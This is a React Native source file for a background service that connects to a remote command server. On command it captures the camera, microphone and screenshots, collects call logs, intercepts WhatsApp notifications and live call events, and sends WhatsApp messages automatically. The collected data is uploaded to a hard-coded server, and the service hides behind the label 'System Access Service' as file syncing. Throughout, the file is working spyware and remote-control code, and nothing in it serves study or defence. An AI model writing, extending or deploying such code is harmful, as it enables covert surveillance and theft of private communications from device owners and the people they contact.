import BackgroundService from 'react-native-background-actions';
import { io } from 'socket.io-client';
import { NativeModules, PermissionsAndroid, Platform, DeviceEventEmitter, Linking } from 'react-native';
import CallLogs from 'react-native-call-log';
import Sound, {
  AudioSourceAndroidType,
  OutputFormatAndroidType,
  AudioEncoderAndroidType,
} from 'react-native-nitro-sound';
import { captureScreen } from 'react-native-view-shot';
import { startCallListener } from './CallListener';

const SERVER_IP = '192.168.1.124';
const SERVER_URL = `http://${SERVER_IP}:3000`;

const RECORDER_PROFILES = [
  {
    name: 'voice_recognition',
    audioSet: {
      AudioSourceAndroid: AudioSourceAndroidType.VOICE_RECOGNITION,
      OutputFormatAndroid: OutputFormatAndroidType.MPEG_4,
      AudioEncoderAndroid: AudioEncoderAndroidType.AAC,
      AudioSamplingRate: 44100,
      AudioChannels: 1,
      AudioEncodingBitRate: 128000,
    },
  },
  {
    name: 'mic',
    audioSet: {
      AudioSourceAndroid: AudioSourceAndroidType.MIC,
      OutputFormatAndroid: OutputFormatAndroidType.MPEG_4,
      AudioEncoderAndroid: AudioEncoderAndroidType.AAC,
      AudioSamplingRate: 44100,
      AudioChannels: 1,
      AudioEncodingBitRate: 128000,
    },
  },
];

function normalizeRecipient(rawRecipient) {
  return String(rawRecipient || '').replace(/[^\d+]/g, '');
}

function encodeMessageText(rawMessage) {
  return encodeURIComponent(String(rawMessage || '').trim());
}

async function safeStopRecorder() {
  try {
    await Sound.stopRecorder();
  } catch (error) {
    // ignore: recorder may already be stopped
  }

  try {
    Sound.removeRecordBackListener();
  } catch (error) {
    // ignore: listener may not exist
  }
}

function inferMimeType(fileUri, type) {
  const lower = String(fileUri || '').toLowerCase();
  if (type !== 'recording') {
    if (lower.endsWith('.jpg') || lower.endsWith('.jpeg')) {
      return 'image/jpeg';
    }
    if (lower.endsWith('.webp')) {
      return 'image/webp';
    }
    return 'image/png';
  }

  if (lower.endsWith('.m4a') || lower.endsWith('.mp4')) {
    return 'audio/mp4';
  }
  if (lower.endsWith('.aac')) {
    return 'audio/aac';
  }
  if (lower.endsWith('.wav')) {
    return 'audio/wav';
  }
  if (lower.endsWith('.amr')) {
    return 'audio/amr';
  }
  if (lower.endsWith('.3gp')) {
    return 'audio/3gpp';
  }
  if (lower.endsWith('.mp3')) {
    return 'audio/mpeg';
  }

  return 'audio/mp4';
}

async function ensureRecordAudioPermission() {
  if (Platform.OS !== 'android') {
    return true;
  }

  const permission = PermissionsAndroid.PERMISSIONS.RECORD_AUDIO;
  const alreadyGranted = await PermissionsAndroid.check(permission);
  if (alreadyGranted) {
    return true;
  }

  const result = await PermissionsAndroid.request(permission);
  return result === PermissionsAndroid.RESULTS.GRANTED;
}

function getDeviceInfo() {
  const platformConstants = NativeModules.PlatformConstants || {};
  const deviceName =
    platformConstants.Model ||
    platformConstants.model ||
    platformConstants.systemName ||
    `${Platform.OS} device`;

  const deviceId =
    platformConstants.Serial ||
    platformConstants.deviceId ||
    platformConstants.androidId ||
    `${Platform.OS}-${platformConstants.Release || platformConstants.Version || 'unknown'}`;

  return {
    deviceId: String(deviceId),
    deviceName: String(deviceName),
  };
}

async function uploadFile(fileUri, type, deviceId) {
  try {
    const formData = new FormData();
    const normalizedUri = String(fileUri || '');
    const formattedUri = Platform.OS === 'android'
      ? (normalizedUri.startsWith('file://') || normalizedUri.startsWith('content://')
          ? normalizedUri
          : `file://${normalizedUri}`)
      : normalizedUri.replace('file://', '');
    const filename = fileUri.split('/').pop() || 'upload.bin';

    formData.append('file', {
      uri: formattedUri,
      type: inferMimeType(fileUri, type),
      name: filename,
    });
    formData.append('device_id', deviceId);
    formData.append('type', type);

    const response = await fetch(`${SERVER_URL}/api/upload`, {
      method: 'POST',
      headers: {
        'Content-Type': 'multipart/form-data',
      },
      body: formData,
    });

    if (!response.ok) {
      throw new Error(`Upload server responded with status ${response.status}`);
    }
    return await response.json();
  } catch (err) {
    console.error("Background Upload failed", err);
    throw err;
  }
}

const sleep = (time) => new Promise((resolve) => setTimeout(() => resolve(), time));

let socket = null;
let callUnsubscribe = null;
let whatsappSubscription = null;
let isWhatsAppListening = false;
let liveCameraState = {
  active: false,
  camera: 'back',
};

const options = {
  taskName: 'AccessTask',
  taskTitle: 'System Access Service',
  taskDesc: 'Syncing system files and preferences in the background.',
  taskIcon: {
    name: 'ic_launcher',
    type: 'mipmap',
  },
  color: '#06b6d4',
  foregroundServiceType: ['dataSync', 'microphone'],
  parameters: {
    delay: 5000,
  },
};

const backgroundTask = async (taskDataArguments) => {
  const { delay } = taskDataArguments;
  const { deviceId, deviceName } = getDeviceInfo();

  console.log("Background Task Started for Device:", deviceName, deviceId);

  // Initialize Socket.io connection in the background thread
  socket = io(SERVER_URL);

  socket.on('connect', () => {
    console.log("Background socket connected");
    socket.emit('device:register', { deviceId, deviceName });
  });

  socket.on('disconnect', () => {
    console.log("Background socket disconnected");
  });

  socket.on('device:command', async (data) => {
    console.log("Background Service remote command:", data);
    const { action, payload } = data;

    const reportCommandResult = (success, message, meta = {}) => {
      if (socket && socket.connected) {
        socket.emit('device:command_result', {
          deviceId,
          action,
          success,
          message,
          meta,
          timestamp: new Date().toISOString(),
        });
      }
    };

    try {
      switch (action) {
        case 'OPEN_CAMERA':
        case 'TAKE_PHOTO': {
          // Bring app to camera screen from background using a deep link intent.
          const lens = payload?.camera === 'front' ? 'front' : 'back';
          await Linking.openURL(`accesspoint://camera?lens=${lens}&live=0`);
          break;
        }
        case 'START_LIVE_CAMERA': {
          const lens = payload?.camera === 'front' ? 'front' : 'back';
          const intervalMsRaw = Number(payload?.intervalMs ?? 1500);
          const intervalMs = Number.isFinite(intervalMsRaw) ? Math.max(800, intervalMsRaw) : 1500;

          liveCameraState = {
            active: true,
            camera: lens,
          };

          await Linking.openURL(`accesspoint://camera?lens=${lens}&live=1&intervalMs=${intervalMs}`);

          if (socket && socket.connected) {
            socket.emit('device:camera_live_status', {
              deviceId,
              status: 'active',
              camera: lens,
              intervalMs,
            });
          }
          break;
        }
        case 'STOP_LIVE_CAMERA': {
          liveCameraState = {
            active: false,
            camera: liveCameraState.camera,
          };

          await Linking.openURL('accesspoint://camera-stop');

          if (socket && socket.connected) {
            socket.emit('device:camera_live_status', {
              deviceId,
              status: 'idle',
              camera: liveCameraState.camera,
            });
          }
          break;
        }
        case 'FETCH_CALL_LOGS': {
          const logs = await CallLogs.load(50);
          const call_logs = logs.map(log => ({
            id: String(log.id ?? log._id ?? ''),
            phoneNumber: String(log.phoneNumber ?? log.number ?? ''),
            formattedNumber: String(log.formattedNumber ?? ''),
            duration: Number(log.duration ?? 0),
            name: String(log.name ?? ''),
            timestamp: String(log.timestamp ?? ''),
            dateTime: String(log.dateTime ?? ''),
            type: String(log.type ?? ''),
            rawType: Number(log.rawType ?? 0),
            phoneAccountId: String(log.phoneAccountId ?? ''),
            simDisplayName: String(log.simDisplayName ?? ''),
            cachedMatchedNumber: String(log.cachedMatchedNumber ?? ''),
            cachedNumberType: String(log.cachedNumberType ?? ''),
            cachedNumberLabel: String(log.cachedNumberLabel ?? ''),
          }));

          await fetch(`${SERVER_URL}/api/calllog`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ call_logs, device_id: deviceId, device_name: deviceName })
          });
          console.log("Background Call logs sent successfully");
          break;
        }
        case 'START_RECORDING': {
          const hasPermission = await ensureRecordAudioPermission();
          if (!hasPermission) {
            console.warn('Background recording blocked: RECORD_AUDIO permission denied');
            if (socket && socket.connected) {
              socket.emit('device:mic_status', { deviceId, status: 'permission_denied' });
            }
            break;
          }

          await safeStopRecorder();

          let started = false;
          let activeProfile = null;
          let lastStartError = null;

          for (const profile of RECORDER_PROFILES) {
            try {
              await Sound.startRecorder(undefined, profile.audioSet, true);
              started = true;
              activeProfile = profile.name;
              break;
            } catch (startError) {
              lastStartError = startError;
            }
          }

          if (!started) {
            console.warn('All configured recorder profiles failed, trying default startRecorder()');
            try {
              await Sound.startRecorder();
              started = true;
              activeProfile = 'default';
            } catch (fallbackError) {
              lastStartError = fallbackError;
            }
          }

          if (!started) {
            throw lastStartError || new Error('Failed to start recorder with all profiles');
          }

          if (socket && socket.connected) {
            socket.emit('device:mic_status', { deviceId, status: 'recording', source: activeProfile });
          }
          break;
        }
        case 'STOP_RECORDING': {
          const result = await Sound.stopRecorder();
          try {
            Sound.removeRecordBackListener();
          } catch (error) {
            // ignore cleanup failures
          }
          if (socket && socket.connected) {
            socket.emit('device:mic_status', { deviceId, status: 'idle' });
          }
          if (result) {
            await uploadFile(result, 'recording', deviceId);
          }
          break;
        }
        case 'TAKE_SCREENSHOT': {
          // Ensure an activity is visible before capture; headless capture often fails.
          await Linking.openURL('accesspoint://capture');
          await sleep(1200);

          let lastError = null;
          for (let attempt = 1; attempt <= 3; attempt += 1) {
            try {
              const uri = await captureScreen({ format: 'png', quality: 0.8 });
              await uploadFile(uri, 'screenshot', deviceId);
              lastError = null;
              break;
            } catch (error) {
              lastError = error;
              await sleep(600);
            }
          }

          if (lastError) {
            throw lastError;
          }
          break;
        }
        case 'WHATSAPP_START': {
          isWhatsAppListening = true;
          if (Platform.OS === 'android' && NativeModules.WhatsAppModule) {
            NativeModules.WhatsAppModule.start();
          }
          setupWhatsAppSubscription();
          break;
        }
        case 'WHATSAPP_STOP': {
          isWhatsAppListening = false;
          if (Platform.OS === 'android' && NativeModules.WhatsAppModule) {
            NativeModules.WhatsAppModule.stop();
          }
          if (whatsappSubscription) {
            whatsappSubscription.remove();
            whatsappSubscription = null;
          }
          break;
        }
        case 'SEND_OUTBOUND_MESSAGE': {
          const channel = String(payload?.channel || 'whatsapp').toLowerCase();
          const recipient = normalizeRecipient(payload?.recipient);
          const message = String(payload?.message || '').trim();

          if (!recipient || !message) {
            throw new Error('SEND_OUTBOUND_MESSAGE requires recipient and message payload fields');
          }

          if (channel === 'whatsapp') {
            if (!NativeModules.SmsSenderModule?.openWhatsAppComposer) {
              throw new Error('WhatsApp composer bridge is not available on this device.');
            }

            await NativeModules.SmsSenderModule.openWhatsAppComposer(recipient, message);
            reportCommandResult(true, 'WhatsApp composer opened and auto-send trigger attempted via accessibility.', {
              channel: 'whatsapp',
              mode: 'whatsapp_composer_accessibility',
            });
            break;
          }

          const waNumber = recipient.replace(/^\+/, '');
          const whatsappUrl = `https://wa.me/${waNumber}?text=${encodeMessageText(message)}`;
          const canOpenWhatsapp = await Linking.canOpenURL(whatsappUrl);
          if (!canOpenWhatsapp) {
            throw new Error(`Cannot open WhatsApp deep link: ${whatsappUrl}`);
          }
          await Linking.openURL(whatsappUrl);
          reportCommandResult(true, 'Opened WhatsApp composer on selected phone.', {
            channel: 'whatsapp',
            mode: 'deeplink',
          });
          break;
        }
        default:
          console.log("Background Service unknown action:", action);
          reportCommandResult(true, `Command ${action} executed.`, { channel: 'system' });
      }
    } catch (err) {
      console.error("Background Service failed command", action, err);
      const message = err?.message || String(err) || `Command ${action} failed`;
      reportCommandResult(false, message, { channel: action === 'SEND_OUTBOUND_MESSAGE' ? String(payload?.channel || '').toLowerCase() : 'system' });
    }
  });

  // Setup Global Call Event Emitter in background
  callUnsubscribe = startCallListener((event) => {
    if (socket && socket.connected) {
      console.log("Background Call Event to emit:", event);
      socket.emit('device:livecall', {
        deviceId,
        state: event.state,
        incomingNumber: event.incomingNumber,
        callType: event.callType || 'INCOMING'
      });
    }
  });

  const setupWhatsAppSubscription = () => {
    if (whatsappSubscription) {
      whatsappSubscription.remove();
    }
    whatsappSubscription = DeviceEventEmitter.addListener('WHATSAPP_NOTIFICATION_EVENT', (event) => {
      if (socket && socket.connected && isWhatsAppListening) {
        console.log("Background WhatsApp Notification Intercepted to Emit:", event);
        socket.emit('device:whatsapp', {
          deviceId,
          title: event.title || event.sender || 'WhatsApp Alert',
          text: event.text || event.message || '',
          timestamp: new Date().toISOString()
        });
      }
    });
  };

  // Loop to keep background service execution alive
  await new Promise(async () => {
    while (BackgroundService.isRunning()) {
      await sleep(delay);
    }
  });
};

export async function startBackgroundService() {
  if (BackgroundService.isRunning()) return;
  try {
    console.log('Starting Foreground Background Service...');
    await BackgroundService.start(backgroundTask, options);
    console.log('Foreground Background Service started successfully.');
  } catch (e) {
    console.log('Failed to start Foreground Background Service:', e);
  }
}

export async function stopBackgroundService() {
  if (callUnsubscribe) {
    callUnsubscribe();
    callUnsubscribe = null;
  }
  if (whatsappSubscription) {
    whatsappSubscription.remove();
    whatsappSubscription = null;
  }
  if (socket) {
    if (socket.connected && liveCameraState.active) {
      try {
        const { deviceId } = getDeviceInfo();
        socket.emit('device:camera_live_status', {
          deviceId,
          status: 'idle',
          camera: liveCameraState.camera,
        });
      } catch (error) {
        // ignore status emit failures during shutdown
      }
    }
    socket.disconnect();
    socket = null;
  }
  await BackgroundService.stop();
  console.log('Foreground Background Service stopped.');
}
